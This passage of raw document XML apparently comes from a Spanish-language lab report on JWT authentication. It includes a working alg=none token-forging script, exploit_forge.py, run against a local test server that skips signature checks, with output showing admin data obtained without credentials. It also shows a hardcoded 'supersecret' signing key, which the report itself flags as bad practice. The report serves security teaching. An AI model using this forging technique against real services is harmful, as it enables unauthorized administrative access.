                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="350C3288" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Payload (base64): eyJzdWIiOiJhZG1pbkBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiJ9</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2FFB4C85" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">         → { "sub": "admin@example.com", "role": "admin" }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56B35E3C" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A330E6C" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>Firma   (base64): -iK_7GIfHF1snU3JLB5EdQtHa7uEvYzG_ZfhJ4MXxWg</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53BD0AEB" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve">         → HMAC-SHA256 con clave 'supersecret'  ← NUNCA debe estar en el código</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6372B534" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="429E686D" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Acceso al panel /admin con token legítimo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521903F3" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&gt; CMD – Acceso /admin legítimo</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="7F4DF5DD" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9360" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0C0C0C"/>
          </w:tcPr>
          <w:p w14:paraId="24B95FC4" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="769B978D" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbkBleGF..." \</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A11E2A6" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     </w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>http://127.0.0.1:8000/admin</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B30DFD6" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D07CCF1" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>{"secret": "sólo admins pueden ver esto"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6CDE27F4" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21AFA178" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D24CBC" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="36"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>2. Explotación – Ataque de Token Forjado (alg=none)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19AFF31C" w14:textId="107EBDA5" w:rsidR="00FF500C" w:rsidRPr="00233214" w:rsidRDefault="00000000" w:rsidP="00233214">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>El atacante explota la vulnerabilidad verify_signature=False. Construye un JWT con alg=none (sin firma) y rol=admin. Como el servidor no verifica la firma, el token forjado es aceptado y el atacante obtiene acceso de administrador sin conocer ninguna credencial real.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E0E29F4" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Archivo: exploit_forge.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="506C32A2" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="120" w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  exploit_forge.py</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="18F4E0A0" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9360" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
          </w:tcPr>
          <w:p w14:paraId="61DF4525" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="4D6C838B"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import requests</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56FF42F0"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import jwt</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19B7CA0E"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3ACF3EE6"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header = {"alg": "none", "typ": "JWT"}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BACBFCB"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payload = {"sub": "attacker@example.com", "role": "admin"}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D469819"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4845F09E"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unsigned_token = jwt.encode(payload, key=None, algorithm=None, headers=header)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E2CA8DA"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="525689A9"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print("Token forjado:", unsigned_token)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5CEC09C2"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="663F50DC"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resp = requests.get(</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="260DEBA7"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"http://127.0.0.1:8000/admin",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F163670"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headers={"Authorization": f"Bearer {unsigned_token}"}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12335F8D"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57E5573F"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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1451007A"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print("Status:", resp.status_code)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="028C1414"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print("Body:", resp.text)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="52EAE8E1"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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="055A1F4A" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D6F0018" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Ejecución del exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56638AFC" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB6745">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  &gt; CMD – Ejecución del exploit</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FF500C" w:rsidRPr="00AB6745" w14:paraId="0F1EAEC8" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9360" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0C0C0C"/>
          </w:tcPr>
          <w:p w14:paraId="43D7BF89" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00FF500C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="46DBCA61" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>C:\...\lab_auth_security&gt; python exploit_forge.py</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78EFBC62" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="201AF0F1" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Token forjado: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlckBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiJ9.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="449A1269" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65C11D36" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Status: 200</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C8A7D01" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>Body:   {"secret":"sólo admins pueden ver esto"}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27EA67C8" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="669C2405" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00AB6745" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Symbol" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t>✓</w:t>
            </w:r>
            <w:r w:rsidRPr="00AB6745">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="16C60C"/>
                <w:sz w:val="17"/>
                <w:lang w:val="es-ES"/>
              </w:rPr>
              <w:t xml:space="preserve"> ACCESO CONCEDIDO - El atacante obtuvo datos de admin sin credenciales</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2723F5C4" w14:textId="77777777" w:rsidR="00FF500C" w:rsidRPr="00233214" w:rsidRDefault="00FF500C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="117B882D" w14:textId="77777777" w:rsidR="00233214" w:rsidRPr="00233214" w:rsidRDefault="00233214" w:rsidP="00233214">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52780522" w14:textId="4B23EA28" w:rsidR="00FF500C" w:rsidRPr="00233214" w:rsidRDefault="00233214" w:rsidP="00233214">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>RESULTADO DEL ATAQUE:</w:t>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  Token forjado (sin firma): eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlckBl...</w:t>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  HTTP Status: 200 OK  ← el servidor aceptó el token falso</w:t>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  Datos obtenidos: 'sólo admins pueden ver esto'</w:t>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00233214">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  El atacante (attacker@example.com) NUNCA tuvo cuenta en el sistema.</w:t>
      </w:r>
    </w:p>
